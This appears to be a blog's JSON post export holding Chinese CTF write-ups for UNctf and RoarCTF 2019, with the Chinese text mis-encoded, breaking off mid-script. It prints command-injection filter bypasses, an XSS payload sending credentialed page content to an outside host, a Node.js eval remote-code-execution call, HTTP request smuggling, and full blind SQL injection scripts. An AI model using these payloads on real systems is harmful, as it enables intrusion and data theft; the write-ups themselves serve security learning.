{"name":"wp","slug":"wp","count":3,"postlist":[{"title":"UNctf èµ›åå›é¡¾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-èµ›åå›é¡¾\"><a href=\"#UNctf-èµ›åå›é¡¾\" class=\"headerlink\" title=\"UNctf èµ›åå›é¡¾\"></a>UNctf èµ›åå›é¡¾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>é¢˜ç›®æºç ï¼š</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>æ­£åˆ™é»‘åå•åŒ¹é…ï¼Œå¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶åŠ ä¸ŠåŒå¼•å·ï¼Œå³ä½¿æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ä¹Ÿä¼šè¢«åŠ ä¸ŠåŒå¼•å·æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œç”¨åˆ°äº†åå¼•å· ```</p>\n<p>è§‚å¯Ÿç¬¬ä¸€ä¸ªæ­£åˆ™ `\\|`` ä¸‰ä¸ªåæ–œæ æ‰èƒ½è½¬ä¹‰åæ–œæ ï¼Œè¿™é‡Œå¯¹ | è¿›è¡Œäº†è½¬ä¹‰ä»è€Œé€ æˆåå¼•å·é€ƒé€¸ã€‚</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>å¯ä»¥çœ‹åˆ°åå¼•å·æˆåŠŸé€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åˆ°é¢˜ç›®ä¸­å°è¯•åˆ—ç›®å½•ï¼Œæ²¡æœ‰ <code>ls</code> å¯ä»¥ç”¨ <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\nå“åº”ï¼š\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>æŸ¥æ‰¾flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\nå“åº”ï¼š\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>ç¬¬äºŒä¸ªæ­£åˆ™ <code>\\\\|\\n</code> ä¼šè§£é‡Šä¸ºç«–çº¿å’Œæ¢è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨ <code>%0a</code> è¿›è¡Œæ¢è¡Œç»•è¿‡ï¼ŒåŒæ—¶æœ«å°¾ä½¿ç”¨ <code>%20#</code> æ¥ç»ˆæ­¢å‘½ä»¤å¤„ç†åŒå¼•å·</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\næ•ˆæœæ˜¯\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>åœ¨ç•™è¨€æ¿å¤„æäº¤ xss å‘ç°èƒ½å¤Ÿè§¦å‘ï¼Œè®¿é—®å‚¨å­˜çš„è·¯å¾„å‘ç°ä¸€ä¸ªæ¥å£</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å¤´é‡Œå¸¦ä¸Šäº† <code>XMLHttpRequest</code> ï¼ŒåŒæ—¶ä¸å¸¦å‚æ•°è®¿é—®æ—¶å¾—åˆ° debug é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° XHRè¯·æ±‚å¸¦ä¸Šäº† cookie ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  XHR è¯·æ±‚</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>æŸ¥çœ‹æºç å‘ç°å„ä¸ªæ¥å£</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`ğŸ™${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>ä¿®æ”¹å®Œåå­—åæµ‹è¯• <code>/calc 1+1</code> å‘ç°æˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨ä»£ç æ³¨å…¥å‚è€ƒ<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>å°è¯• <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> å…¶ä¸­ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ $IFS ï¼ŒåŒæ—¶Syncé‡‡ç”¨éé˜»å¡è¿”å›ã€‚</p>\n","text":"UNctf èµ›åå›é¡¾bypassé¢˜ç›®æºç ï¼š&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"roarctf 2019","slug":"roarctf-2019","date":"2019-10-16T08:45:49.000Z","updated":"2019-11-06T13:13:29.498Z","comments":true,"path":"api/articles/roarctf-2019.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"roarctf-2019\"><a href=\"#roarctf-2019\" class=\"headerlink\" title=\"roarctf 2019\"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p>\n<h2 id=\"easy-java\"><a href=\"#easy-java\" class=\"headerlink\" title=\"easy_java\"></a>easy_java</h2><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• <code>/Download?filename=help.docx</code> ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ <code>SSTI</code> ?fuzzäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°æ€è·¯.  ğŸ¨</p>\n<p>æ”¹å˜è¯·æ±‚æ–¹å¼ä¸º <code>post</code> å³å¯æˆåŠŸä¸‹è½½åˆ° <code>help.docx</code> ,é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ </p>\n<p>éšä¾¿ä¸‹è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¾—åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæœ‰æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚åšçš„æ—¶å€™å°±è¢«éš¾åˆ°çš„åœ°æ–¹å°±æ˜¯æ–‡ä»¶ä¸‹è½½ä¸çŸ¥é“ä¸‹è½½ä»€ä¹ˆä¸œè¥¿ã€‚è®°å¾—ä¸Šæ¬¡ç¢°åˆ°è¿™ç§é¢˜çš„æ—¶å€™è¿˜æ˜¯ <code>SUCTF</code> è¯» <code>nginx</code> é…ç½®æ–‡ä»¶</p>\n<h3 id=\"ä»€ä¹ˆæ˜¯-WEB-INF\"><a href=\"#ä»€ä¹ˆæ˜¯-WEB-INF\" class=\"headerlink\" title=\"ä»€ä¹ˆæ˜¯ WEB-INF\"></a>ä»€ä¹ˆæ˜¯ WEB-INF</h3><blockquote>\n<p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p>\n</blockquote>\n<ol>\n<li><p>/WEB-INF/web.xml</p>\n<p> Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p>\n</li>\n<li><p>/WEB-INF/classes/</p>\n<p> åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰ã€‚</p>\n</li>\n</ol>\n<p>å…¶ä»–çš„é…ç½®æ–‡ä»¶ä»‹ç»çœ‹<a href=\"https://baike.baidu.com/item/web-inf\" title=\"è¿™é‡Œ\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/web-inf</a></p>\n<p>äº‹å®ä¸Šå°±æ˜¯åœ¨xmlä¸­é…ç½®å¥½æ˜ å°„è·¯å¾„ç„¶åè¿›è¡Œå¯¹æŸäº›å«å—ä¿æŠ¤å†…å®¹æ–‡ä»¶çš„è®¿é—®ã€‚</p>\n<p>æˆ‘ä»¬è®¿é—® <code>WEB-INF/web.xml</code> å‘ç°æ“ä½œflagçš„å…³é”®é…ç½®</p>\n<p>æŒ‰ç…§æ˜ å°„å…³ç³»è®¿é—® <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯å¾—åˆ°è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å³å¯</p>\n<h2 id=\"easy-calc\"><a href=\"#easy-calc\" class=\"headerlink\" title=\"easy_calc\"></a>easy_calc</h2><p>å³é”®æŸ¥çœ‹æºç </p>\n<pre><code>&lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;num&apos;])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET[&apos;num&apos;];\n        $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;,&apos;\\$&apos;,&apos;\\\\&apos;,&apos;\\^&apos;];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {\n                        die(&quot;what are you want to do?&quot;);\n                }\n        }\n        eval(&apos;echo &apos;.$str.&apos;;&apos;);\n}\n?&gt; </code></pre><p>æœ‰wafï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p>\n<ol>\n<li>åˆ©ç”¨å­—ç¬¦ä¸²è§£æç‰¹æ€§ Bypass</li>\n</ol>\n<p>åŸç†çœ‹è¿™ç¯‡æ–‡ç« ï¼š<br><a href=\"https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/\" target=\"_blank\" rel=\"noopener\">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p>\n<p>è¿™é‡Œè¯´ä¸€ä¸‹å¤§æ¦‚æ„æ€<br> PHP å¤„ç† GET or POST è¯·æ±‚æ—¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> ã€‚å‚æ•°åé‡Œçš„ä¸€äº›å­—ç¬¦ä¼šè¢«ç§»é™¤æˆ–æ›¿æ¢æˆä¸‹åˆ’çº¿ <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> å¦‚æœWAFè§„åˆ™æ˜¯å‚æ•°é‡Œå«æœ‰ä¸€ä¸ªéæ•°å€¼å‹çš„å€¼æ—¶è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ç»•è¿‡<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> å®ƒä¼šè¢«å­˜å‚¨åœ¨ <code>$_GET[&quot;news_id&quot;]</code> ã€‚</p>\n<p>è¿™æ˜¯æµ‹è¯•phpæ˜¯å¦‚ä½•å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<pre><code>&lt;?php\nforeach(\n    [\n        &quot;{chr}foo_bar&quot;,\n        &quot;foo{chr}bar&quot;,\n        &quot;foo_bar{chr}&quot;\n    ] as $k =&gt; $arg) {\n    for($i=0;$i&lt;=255;$i++) {\n        echo &quot;\\033[999D\\033[K\\r&quot;;\n        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;\n        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);\n        /* yes... I&apos;ve added a sleep time on each loop just for\n        the scenic effect :)\nlike that movie with unrealistic\n        brute-force where the password are obtained\n        one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ\n        */\n        usleep(5000);\n        if(isset($o[&quot;foo_bar&quot;])) {\n            echo &quot;\\033[999D\\033[K\\r&quot;;\n            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\\n&quot;;\n        }\n    }\n    echo &quot;\\033[999D\\033[K\\r&quot;;\n    echo &quot;\\n&quot;;\n}</code></pre><p>è¿™é“é¢˜ç›®ç»è¿‡æµ‹è¯•å‚æ•°å‰åŠ ä¸€ä¸ª <code>%20</code>æˆ–è€… <code>+</code> æ¥ç»•è¿‡</p>\n<ol start=\"2\">\n<li>httpåè®®èµ°ç§æ”»å‡»</li>\n</ol>\n<blockquote>\n<p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p>\n</blockquote>\n<p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ CL-CL æ¥Bypass</p>\n<pre><code>POST /calc.php?num=phpinfo() HTTP/1.1\nHost: ********\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nX-Requested-With: XMLHttpRequest\nConnection: keep-alive\nReferer: **********\nCookie: __cfduid=***********\nX-Forwarded-For: 127.0.0.1\nContent-Length: 7\nContent-Length: 7\nContent-Type: application/x-www-form-urlencoded\n\nnum=111</code></pre><p>ç»•è¿‡wafä¹‹åè¿˜ç¦æ‰äº†ä¸€äº›å­—ç¬¦ä¸èƒ½ç›´æ¥è¯»åˆ° flag ã€‚</p>\n<p>å…ˆå­¦ä¹ å‡ ä¸ªå‡½æ•°</p>\n<ul>\n<li>ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</li>\n<li>bin2hex â€” å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</li>\n<li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li>\n<li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li>\n<li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li>\n<li>hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</li>\n</ul>\n<p>è¯»å–flag</p>\n<pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id=\"Online-Proxy\"><a href=\"#Online-Proxy\" class=\"headerlink\" title=\"Online Proxy\"></a>Online Proxy</h2><p>æ‰“å¼€é¶æœºï¼ŒæŠ“åŒ…å‘ç°å“åº”å¤´</p>\n<pre><code>&lt;!-- Debug Info: \n Duration: 0.058279037475586 s \n Current Ip: 127.0.0.1 </code></pre><p>åœ¨ XFF å¤„å°è¯•ä¿®æ”¹å†…å®¹ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸã€‚<code>Current Ip</code> å¤„æ˜¾ç¤ºå½“å‰çš„ XFFå€¼ï¼Œ<code>Last Ip</code> æ˜¾ç¤ºä¸Šæ¬¡æŸ¥è¯¢å†…å®¹ã€‚æ‰§è¡Œ sleep() è¯­å¥ <code>1&#39; and sleep(3) and 1=&#39;1</code> å‘ç°åœ¨ç¬¬äºŒæ¬¡è¿›è¡Œä¿®æ”¹å‘åŒ…ä¹‹åæˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p>\n<p>æ‰€è°“äºŒæ¬¡æ³¨å…¥å°±æ˜¯æœåŠ¡ç«¯åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è„æ•°æ®æ—¶å¯¹æ•°æ®è¿›è¡Œäº† <code>addslashes</code> æˆ– <code>mysql_escape_string</code>  å¤„ç†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“æ—¶å­˜çš„è¿˜æ˜¯è„æ•°æ®ï¼Œäºæ˜¯åœ¨ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶ç”±äºæŸ¥è¯¢çš„æ˜¯è„æ•°æ®ï¼Œä¿¡æ¯ä»ç„¶ä¼šæ³„éœ²ã€‚</p>\n<p>æŸ¥çœ‹æºç ï¼š</p>\n<pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);\n$content = str_replace(&quot;&lt;a href=\\&quot;&quot;, &quot;&lt;a href=\\&quot;/?url=&quot;, $content);\n$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);\necho($content);\n$end = microtime(true);\n$time = $end - $start;\n$last_ip = &quot;&quot;;\n$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\nif(count($result) &gt; 0) {\n    if($ip !== $result[0][&apos;current_ip&apos;]) {\n        $last_ip = $result[0][&apos;current_ip&apos;];\n        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);\n    } else {\n        $last_ip = $result[0][&apos;last_ip&apos;];\n    }\n}\nquery(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);\ndie(&quot;\\n&lt;!-- Debug Info: \\n Duration: $time s \\n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æŸ¥è¯¢åˆ°æ•°æ®ä¹‹åï¼Œå¦‚æœ <code>$ip !== $result[0][&#39;current_ip&#39;]</code> é‚£ä¹ˆ <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ï¼Œéšåå°† last_ip ä¸å¸¦è¿‡æ»¤çš„å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚</p>\n<p>æ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„æ€è·¯å°±æ˜¯å…ˆå°† exp æ’å…¥æ•°æ®ï¼Œç„¶åå†æ­£å¸¸è®¿é—®ä¸€æ¬¡å°†æ•°æ®å¸¦å‡ºã€‚</p>\n<p>exp:</p>\n<pre><code>import requests\nfrom time import sleep\nurl = &quot;http://node3.buuoj.cn:28063/&quot;\ns = requests.session()\n\nre = s.get(url)\nname = &apos;&apos;\n&quot;&quot;&quot;\n# database name\n# current db : ctf\n# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctf\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# table name\n# ctf : ip_log\n# F4l9_D4t4B45e : F4l9_t4b1e\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\n&quot;&quot;&quot;\n# column_name\n# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMn\nfor i in range(1,20):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break\n&quot;&quot;&quot;\nfor i in range(1,100):\n    print &apos;[+]: &apos;,i\n    for j in range(33,128):\n        sleep(0.01)\n        headers1 = {\n&quot;X-Forwarded-For&quot;: &apos;1&apos;\n}\n        headers2 = {\n    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)\n}\n        re1 = s.get(url,headers = headers2)\n        try:\n            re2 = s.get(url,headers=headers1,timeout=2)\n        except Exception as e:\n            #print &quot;[-]: &quot;+str(e)\n            name += chr(j)\n            print name\n            break</code></pre><p>è¿™ä¸ªå¤ªä¸ä¼˜é›…äº†ï¼Œèµµå¸ˆå‚…çš„æ›´ä¼˜é›…ï¼š</p>\n<pre><code>#!/usr/bin/env python3\n\nimport requests\n\ntarget = &quot;http://localhost:8302/&quot;\n\ndef execute_sql(sql):\n    print(&quot;[*]è¯·æ±‚è¯­å¥ï¼š&quot; + sql)\n    return_result = &quot;&quot;\n\n    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;\n    session = requests.session()\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n    start_pos = r.text.find(&quot;Last Ip: &quot;)\n    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n    length = int(r.text[start_pos + 9: end_pos])\n    print(&quot;[+]é•¿åº¦ï¼š&quot; + str(length))\n\n    for i in range(1, length + 1, 5):\n        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;\n\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})\n        start_pos = r.text.find(&quot;Last Ip: &quot;)\n        end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)\n        result = int(r.text[start_pos + 9: end_pos])\n        return_result += bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;)\n\n        print(&quot;[+]ä½ç½® &quot; + str(i) + &quot; è¯·æ±‚äº”ä½æˆåŠŸ:&quot; + bytes.fromhex(hex(result)[2:]).decode(&apos;utf-8&apos;))\n\n    return return_result\n\n\n# 